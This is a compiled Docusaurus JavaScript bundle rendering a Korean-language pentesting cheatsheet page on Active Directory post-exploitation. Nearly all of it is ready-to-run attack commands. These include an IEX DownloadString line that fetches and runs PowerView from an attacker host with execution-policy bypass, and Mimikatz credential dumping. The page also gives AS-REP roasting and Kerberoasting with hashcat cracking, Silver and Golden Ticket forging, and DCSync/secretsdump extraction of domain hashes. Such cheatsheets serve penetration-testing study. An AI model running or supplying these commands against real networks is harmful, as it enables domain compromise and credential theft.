"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[1639],{28453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>c});var i=s(96540);const r={},t=i.createContext(r);function l(e){const n=i.useContext(t);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),i.createElement(t.Provider,{value:n},e.children)}},72312:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>c,default:()=>h,frontMatter:()=>l,metadata:()=>i,toc:()=>d});const i=JSON.parse('{"id":"cheatsheet/post-exploitation/active-directory","title":"Active Directory","description":"Active Directory \ud658\uacbd\uc5d0\uc11c\uc758 Post Exploitation \uae30\ubc95\uc785\ub2c8\ub2e4.","source":"@site/docs/cheatsheet/post-exploitation/active-directory.md","sourceDirName":"cheatsheet/post-exploitation","slug":"/cheatsheet/post-exploitation/active-directory","permalink":"/my-docusaurus-page/cheatsheet/post-exploitation/active-directory","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"Post Exploitation","permalink":"/my-docusaurus-page/category/post-exploitation"},"next":{"title":"Lateral Movement","permalink":"/my-docusaurus-page/cheatsheet/post-exploitation/lateral-movement"}}');var r=s(74848),t=s(28453);const l={sidebar_position:1},c="Active Directory",a={},d=[{value:"\uc218\ub3d9 \uc5f4\uac70",id:"\uc218\ub3d9-\uc5f4\uac70",level:2},{value:"\uc0ac\uc6a9\uc790 \uc815\ubcf4",id:"\uc0ac\uc6a9\uc790-\uc815\ubcf4",level:3},{value:"\uadf8\ub8f9 \uc815\ubcf4",id:"\uadf8\ub8f9-\uc815\ubcf4",level:3},{value:"\ucef4\ud4e8\ud130 \uc815\ubcf4",id:"\ucef4\ud4e8\ud130-\uc815\ubcf4",level:3},{value:"PowerView\ub97c \uc774\uc6a9\ud55c \uc5f4\uac70",id:"powerview\ub97c-\uc774\uc6a9\ud55c-\uc5f4\uac70",level:2},{value:"\uc124\uce58 \ubc0f \ub85c\ub4dc",id:"\uc124\uce58-\ubc0f-\ub85c\ub4dc",level:3},{value:"\ub3c4\uba54\uc778 \uc815\ubcf4",id:"\ub3c4\uba54\uc778-\uc815\ubcf4",level:3},{value:"\uc0ac\uc6a9\uc790 \uc5f4\uac70",id:"\uc0ac\uc6a9\uc790-\uc5f4\uac70",level:3},{value:"\uadf8\ub8f9 \uc5f4\uac70",id:"\uadf8\ub8f9-\uc5f4\uac70",level:3},{value:"\ucef4\ud4e8\ud130 \uc5f4\uac70",id:"\ucef4\ud4e8\ud130-\uc5f4\uac70",level:3},{value:"\uc138\uc158 \uc5f4\uac70",id:"\uc138\uc158-\uc5f4\uac70",level:3},{value:"\uacf5\uc720 \uc5f4\uac70",id:"\uacf5\uc720-\uc5f4\uac70",level:3},{value:"SPN \uc5f4\uac70",id:"spn-\uc5f4\uac70",level:2},{value:"setspn",id:"setspn",level:3},{value:"PowerView",id:"powerview",level:3},{value:"nslookup",id:"nslookup",level:3},{value:"\uac1d\uccb4 \uad8c\ud55c \uc5f4\uac70",id:"\uac1d\uccb4-\uad8c\ud55c-\uc5f4\uac70",level:2},{value:"\uc8fc\uc694 \uad8c\ud55c",id:"\uc8fc\uc694-\uad8c\ud55c",level:3},{value:"PowerView",id:"powerview-1",level:3},{value:"\uc790\uaca9\uc99d\uba85 \uc218\uc9d1",id:"\uc790\uaca9\uc99d\uba85-\uc218\uc9d1",level:2},{value:"Mimikatz",id:"mimikatz",level:3},{value:"\ud2b9\uc815 \uc704\uce58 \uc811\uadfc",id:"\ud2b9\uc815-\uc704\uce58-\uc811\uadfc",level:3},{value:"AS-REP Roasting",id:"as-rep-roasting",level:2},{value:"impacket-GetNPUsers",id:"impacket-getnpusers",level:3},{value:"Rubeus",id:"rubeus",level:3},{value:"Kerberoasting",id:"kerberoasting",level:2},{value:"impacket-GetUserSPNs",id:"impacket-getuserspns",level:3},{value:"Rubeus",id:"rubeus-1",level:3},{value:"Silver Ticket",id:"silver-ticket",level:2},{value:"\ud544\uc694 \uc815\ubcf4",id:"\ud544\uc694-\uc815\ubcf4",level:3},{value:"\uc0dd\uc131",id:"\uc0dd\uc131",level:3},{value:"Golden Ticket",id:"golden-ticket",level:2},{value:"\ud544\uc694 \uc815\ubcf4",id:"\ud544\uc694-\uc815\ubcf4-1",level:3},{value:"DCSync\ub85c krbtgt \ud574\uc2dc \ud68d\ub4dd",id:"dcsync\ub85c-krbtgt-\ud574\uc2dc-\ud68d\ub4dd",level:3},{value:"Golden Ticket \uc0dd\uc131",id:"golden-ticket-\uc0dd\uc131",level:3},{value:"DCSync",id:"dcsync",level:2},{value:"\ud544\uc694 \uad8c\ud55c",id:"\ud544\uc694-\uad8c\ud55c",level:3},{value:"mimikatz",id:"mimikatz-1",level:3},{value:"impacket-secretsdump",id:"impacket-secretsdump",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function o(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"active-directory",children:"Active Directory"})}),"\n",(0,r.jsx)(n.p,{children:"Active Directory \ud658\uacbd\uc5d0\uc11c\uc758 Post Exploitation \uae30\ubc95\uc785\ub2c8\ub2e4."}),"\n",(0,r.jsx)(n.h2,{id:"\uc218\ub3d9-\uc5f4\uac70",children:"\uc218\ub3d9 \uc5f4\uac70"}),"\n",(0,r.jsx)(n.h3,{id:"\uc0ac\uc6a9\uc790-\uc815\ubcf4",children:"\uc0ac\uc6a9\uc790 \uc815\ubcf4"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:"# \ub3c4\uba54\uc778 \uc0ac\uc6a9\uc790 \ubaa9\ub85d\nnet user /domain\n\n# \ud2b9\uc815 \uc0ac\uc6a9\uc790 \uc815\ubcf4\nnet user <USERNAME> /domain\n\n# \ud604\uc7ac \uc0ac\uc6a9\uc790\nwhoami /all\nwhoami /user\nwhoami /groups\nwhoami /priv\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\uadf8\ub8f9-\uc815\ubcf4",children:"\uadf8\ub8f9 \uc815\ubcf4"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:'# \ub3c4\uba54\uc778 \uadf8\ub8f9 \ubaa9\ub85d\nnet group /domain\n\n# \ud2b9\uc815 \uadf8\ub8f9 \uba64\ubc84\nnet group "Domain Admins" /domain\nnet group "Enterprise Admins" /domain\n\n# \ub85c\uceec \uadf8\ub8f9\nnet localgroup\nnet localgroup Administrators\n'})}),"\n",(0,r.jsx)(n.h3,{id:"\ucef4\ud4e8\ud130-\uc815\ubcf4",children:"\ucef4\ud4e8\ud130 \uc815\ubcf4"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:"# \ub3c4\uba54\uc778 \ucee8\ud2b8\ub864\ub7ec\nnltest /dclist:<DOMAIN>\n\n# \ub3c4\uba54\uc778 \uc2e0\ub8b0\nnltest /domain_trusts\n"})}),"\n",(0,r.jsx)(n.h2,{id:"powerview\ub97c-\uc774\uc6a9\ud55c-\uc5f4\uac70",children:"PowerView\ub97c \uc774\uc6a9\ud55c \uc5f4\uac70"}),"\n",(0,r.jsx)(n.h3,{id:"\uc124\uce58-\ubc0f-\ub85c\ub4dc",children:"\uc124\uce58 \ubc0f \ub85c\ub4dc"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# \ub2e4\uc6b4\ub85c\ub4dc\niwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -outfile PowerView.ps1\n\n# \ub85c\ub4dc\npowershell -ep bypass\n. .\\PowerView.ps1\n\n# \ub610\ub294 \uba54\ubaa8\ub9ac\uc5d0\uc11c \uc9c1\uc811\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1')\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\ub3c4\uba54\uc778-\uc815\ubcf4",children:"\ub3c4\uba54\uc778 \uc815\ubcf4"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'# \ub3c4\uba54\uc778 \uc815\ubcf4\nGet-NetDomain\n\n# \ub3c4\uba54\uc778 \ucee8\ud2b8\ub864\ub7ec\nGet-NetDomainController\n\n# \ub3c4\uba54\uc778 \uc815\ucc45\nGet-DomainPolicy\n(Get-DomainPolicy)."SystemAccess"\n\n# \ud3ec\ub808\uc2a4\ud2b8 \uc815\ubcf4\nGet-NetForest\nGet-NetForestDomain\n'})}),"\n",(0,r.jsx)(n.h3,{id:"\uc0ac\uc6a9\uc790-\uc5f4\uac70",children:"\uc0ac\uc6a9\uc790 \uc5f4\uac70"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# \ubaa8\ub4e0 \uc0ac\uc6a9\uc790\nGet-NetUser\nGet-NetUser | select cn\nGet-NetUser | select cn,pwdlastset,lastlogon\n\n# \ud2b9\uc815 \uc0ac\uc6a9\uc790\nGet-NetUser -Username <USERNAME>\n\n# \uc0ac\uc6a9\uc790 \uc18d\uc131\nGet-NetUser -Username <USERNAME> | select *\n\n# SPN \uc788\ub294 \uc0ac\uc6a9\uc790 (Kerberoasting)\nGet-NetUser -SPN\nGet-NetUser -SPN | select samaccountname,serviceprincipalname\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\uadf8\ub8f9-\uc5f4\uac70",children:"\uadf8\ub8f9 \uc5f4\uac70"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'# \ubaa8\ub4e0 \uadf8\ub8f9\nGet-NetGroup\nGet-NetGroup | select cn\n\n# \ud2b9\uc815 \uadf8\ub8f9\nGet-NetGroup "Domain Admins"\nGet-NetGroup "Enterprise Admins"\n\n# \uadf8\ub8f9 \uba64\ubc84\nGet-NetGroupMember "Domain Admins"\nGet-NetGroupMember "Domain Admins" | select MemberName\n'})}),"\n",(0,r.jsx)(n.h3,{id:"\ucef4\ud4e8\ud130-\uc5f4\uac70",children:"\ucef4\ud4e8\ud130 \uc5f4\uac70"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# \ubaa8\ub4e0 \ucef4\ud4e8\ud130\nGet-NetComputer\nGet-NetComputer | select operatingsystem,dnshostname\nGet-NetComputer | select dnshostname,operatingsystem,operatingsystemversion\n\n# \uc0b4\uc544\uc788\ub294 \ucef4\ud4e8\ud130\nGet-NetComputer -Ping\n\n# \ub85c\uceec \uad00\ub9ac\uc790 \uc561\uc138\uc2a4 \ud655\uc778\nFind-LocalAdminAccess\n\n# \ub3c4\uba54\uc778 \uad00\ub9ac\uc790 \uc138\uc158 \ucc3e\uae30\nFind-DomainUserLocation\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\uc138\uc158-\uc5f4\uac70",children:"\uc138\uc158 \uc5f4\uac70"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# \ud2b9\uc815 \ucef4\ud4e8\ud130\uc758 \uc138\uc158\nGet-NetSession -ComputerName <RHOST>\nGet-NetSession -ComputerName <RHOST> -Verbose\n\n# \ub808\uc9c0\uc2a4\ud2b8\ub9ac ACL \ud655\uc778\nGet-Acl -Path HKLM:SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\ | fl\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\uacf5\uc720-\uc5f4\uac70",children:"\uacf5\uc720 \uc5f4\uac70"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# \ub3c4\uba54\uc778 \uacf5\uc720\nFind-DomainShare\n\n# \ud2b9\uc815 \uacbd\ub85c\nls \\\\<RHOST>\\sysvol\\<DOMAIN>\\\nls \\\\<RHOST>\\sysvol\\<DOMAIN>\\Policies\\\n\n# GPP \ud30c\uc77c \uc77d\uae30\ncat \\\\<RHOST>\\sysvol\\<DOMAIN>\\Policies\\oldpolicy\\old-policy-backup.xml\n"})}),"\n",(0,r.jsx)(n.h2,{id:"spn-\uc5f4\uac70",children:"SPN \uc5f4\uac70"}),"\n",(0,r.jsx)(n.h3,{id:"setspn",children:"setspn"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:"setspn -L iis_service\nsetspn -T <DOMAIN> -Q */*\n"})}),"\n",(0,r.jsx)(n.h3,{id:"powerview",children:"PowerView"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"Get-NetUser -SPN | select samaccountname,serviceprincipalname\n"})}),"\n",(0,r.jsx)(n.h3,{id:"nslookup",children:"nslookup"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:"nslookup.exe <RHOST>\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\uac1d\uccb4-\uad8c\ud55c-\uc5f4\uac70",children:"\uac1d\uccb4 \uad8c\ud55c \uc5f4\uac70"}),"\n",(0,r.jsx)(n.h3,{id:"\uc8fc\uc694-\uad8c\ud55c",children:"\uc8fc\uc694 \uad8c\ud55c"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"\uad8c\ud55c"}),(0,r.jsx)(n.th,{children:"\uc124\uba85"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"GenericAll"}),(0,r.jsx)(n.td,{children:"\uac1d\uccb4\uc5d0 \ub300\ud55c \ubaa8\ub4e0 \uad8c\ud55c"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"GenericWrite"}),(0,r.jsx)(n.td,{children:"\ud2b9\uc815 \uc18d\uc131 \ud3b8\uc9d1"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"WriteOwner"}),(0,r.jsx)(n.td,{children:"\uac1d\uccb4 \uc18c\uc720\uad8c \ubcc0\uacbd"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"WriteDACL"}),(0,r.jsx)(n.td,{children:"ACE \ud3b8\uc9d1"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"AllExtendedRights"}),(0,r.jsx)(n.td,{children:"\ube44\ubc00\ubc88\ud638 \ubcc0\uacbd \ub4f1"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"ForceChangePassword"}),(0,r.jsx)(n.td,{children:"\ube44\ubc00\ubc88\ud638 \uac15\uc81c \ubcc0\uacbd"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Self (Self-Membership)"}),(0,r.jsx)(n.td,{children:"\uadf8\ub8f9\uc5d0 \uc790\uc2e0 \ucd94\uac00"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"powerview-1",children:"PowerView"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'# \uac1d\uccb4 ACL\nGet-ObjectAcl -Identity <USERNAME>\n\n# \ud2b9\uc815 \uad8c\ud55c\nGet-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights\n\n# SID \ubcc0\ud658\nConvert-SidToName S-1-5-21-1987370373-658406905-1781884369-1104\n\n# \uadf8\ub8f9 \uba64\ubc84 \ud655\uc778\nGet-NetGroup "<GROUP>" | select member\n\n# \uadf8\ub8f9 \uba64\ubc84 \ucd94\uac00/\uc0ad\uc81c\nnet group "<GROUP>" <USERNAME> /add /domain\nnet group "<GROUP>" <USERNAME> /del /domain\n'})}),"\n",(0,r.jsx)(n.h2,{id:"\uc790\uaca9\uc99d\uba85-\uc218\uc9d1",children:"\uc790\uaca9\uc99d\uba85 \uc218\uc9d1"}),"\n",(0,r.jsx)(n.h3,{id:"mimikatz",children:"Mimikatz"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:".\\mimikatz.exe\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::tickets\n"})}),"\n",(0,r.jsx)(n.h3,{id:"\ud2b9\uc815-\uc704\uce58-\uc811\uadfc",children:"\ud2b9\uc815 \uc704\uce58 \uc811\uadfc"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:"dir \\\\<RHOST>\\<SHARE>\ndir \\\\<DC>\\c$\n"})}),"\n",(0,r.jsx)(n.h2,{id:"as-rep-roasting",children:"AS-REP Roasting"}),"\n",(0,r.jsx)(n.h3,{id:"impacket-getnpusers",children:"impacket-GetNPUsers"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \uc0ac\uc6a9\uc790 \ubaa9\ub85d\uc73c\ub85c\nimpacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>\n\n# \uc778\uc99d \uc5c6\uc774\nimpacket-GetNPUsers -dc-ip <DC_IP> -usersfile users.txt -format hashcat <DOMAIN>/\n\n# \ud06c\ub799\nhashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n"})}),"\n",(0,r.jsx)(n.h3,{id:"rubeus",children:"Rubeus"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:".\\Rubeus.exe asreproast /nowrap\n\n# \ucd9c\ub825 \ud30c\uc77c\n.\\Rubeus.exe asreproast /outfile:hashes.asreproast\n"})}),"\n",(0,r.jsx)(n.h2,{id:"kerberoasting",children:"Kerberoasting"}),"\n",(0,r.jsx)(n.h3,{id:"impacket-getuserspns",children:"impacket-GetUserSPNs"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# SPN \ubaa9\ub85d\nimpacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>\n\n# \ud574\uc2dc \uc694\uccad\nimpacket-GetUserSPNs -dc-ip <DC_IP> -request <DOMAIN>/<USERNAME>\n\n# \ud06c\ub799\nhashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n"})}),"\n",(0,r.jsx)(n.h3,{id:"rubeus-1",children:"Rubeus"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast\n\n# \ud06c\ub799\nhashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n"})}),"\n",(0,r.jsx)(n.h2,{id:"silver-ticket",children:"Silver Ticket"}),"\n",(0,r.jsx)(n.h3,{id:"\ud544\uc694-\uc815\ubcf4",children:"\ud544\uc694 \uc815\ubcf4"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"SPN \ube44\ubc00\ubc88\ud638 \ud574\uc2dc"}),"\n",(0,r.jsx)(n.li,{children:"\ub3c4\uba54\uc778 SID"}),"\n",(0,r.jsx)(n.li,{children:"\ud0c0\uac9f SPN"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\uc0dd\uc131",children:"\uc0dd\uc131"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:"# SID \ud655\uc778\nwhoami /user\n\n# Silver Ticket \uc0dd\uc131\n.\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # kerberos::golden /sid:S-1-5-21-xxx /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:<HASH> /user:<USERNAME>\n\n# \ud655\uc778\nklist\n\n# \uc811\uadfc\niwr -UseDefaultCredentials http://<RHOST>\n"})}),"\n",(0,r.jsx)(n.h2,{id:"golden-ticket",children:"Golden Ticket"}),"\n",(0,r.jsx)(n.h3,{id:"\ud544\uc694-\uc815\ubcf4-1",children:"\ud544\uc694 \uc815\ubcf4"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"krbtgt NTLM \ud574\uc2dc"}),"\n",(0,r.jsx)(n.li,{children:"\ub3c4\uba54\uc778 SID"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"dcsync\ub85c-krbtgt-\ud574\uc2dc-\ud68d\ub4dd",children:"DCSync\ub85c krbtgt \ud574\uc2dc \ud68d\ub4dd"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:".\\mimikatz.exe\nmimikatz # lsadump::dcsync /user:<DOMAIN>\\krbtgt\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"impacket-secretsdump -just-dc-user krbtgt <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>\n"})}),"\n",(0,r.jsx)(n.h3,{id:"golden-ticket-\uc0dd\uc131",children:"Golden Ticket \uc0dd\uc131"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:".\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-xxx /krbtgt:<HASH> /ptt\n\n# \ub610\ub294\nmimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-xxx /krbtgt:<HASH> /id:500\n\n# \ud655\uc778\nmisc::cmd\nklist\ndir \\\\<DC>\\c$\n"})}),"\n",(0,r.jsx)(n.h2,{id:"dcsync",children:"DCSync"}),"\n",(0,r.jsx)(n.h3,{id:"\ud544\uc694-\uad8c\ud55c",children:"\ud544\uc694 \uad8c\ud55c"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Replicating Directory Changes"}),"\n",(0,r.jsx)(n.li,{children:"Replicating Directory Changes All"}),"\n",(0,r.jsx)(n.li,{children:"Replicating Directory Changes in Filtered Set"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"mimikatz-1",children:"mimikatz"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-cmd",children:".\\mimikatz.exe\nmimikatz # lsadump::dcsync /user:<DOMAIN>\\<USERNAME>\nmimikatz # lsadump::dcsync /user:<DOMAIN>\\Administrator\nmimikatz # lsadump::dcsync /user:<DOMAIN>\\krbtgt\n"})}),"\n",(0,r.jsx)(n.h3,{id:"impacket-secretsdump",children:"impacket-secretsdump"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \ud2b9\uc815 \uc0ac\uc6a9\uc790\nimpacket-secretsdump -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>\n\n# \uc804\uccb4 \ub364\ud504\nimpacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"PowerView\ub294 \uac15\ub825\ud55c AD \uc5f4\uac70 \ub3c4\uad6c"}),"\n",(0,r.jsx)(n.li,{children:"Kerberoasting\uc740 SPN \uc788\ub294 \uacc4\uc815 \ub300\uc0c1"}),"\n",(0,r.jsx)(n.li,{children:"AS-REP Roasting\uc740 Pre-Auth \ube44\ud65c\uc131\ud654\ub41c \uacc4\uc815 \ub300\uc0c1"}),"\n",(0,r.jsx)(n.li,{children:"Golden Ticket\uc740 krbtgt \ud574\uc2dc \ud544\uc694"}),"\n",(0,r.jsx)(n.li,{children:"Silver Ticket\uc740 \uc11c\ube44\uc2a4 \uacc4\uc815 \ud574\uc2dc \ud544\uc694"}),"\n",(0,r.jsx)(n.li,{children:"DCSync\ub294 \ubcf5\uc81c \uad8c\ud55c \ud544\uc694"}),"\n",(0,r.jsx)(n.li,{children:"\ubaa8\ub4e0 \uacf5\uaca9\uc740 \uc801\uc808\ud55c \uad8c\ud55c \ud544\uc694"}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}}}]);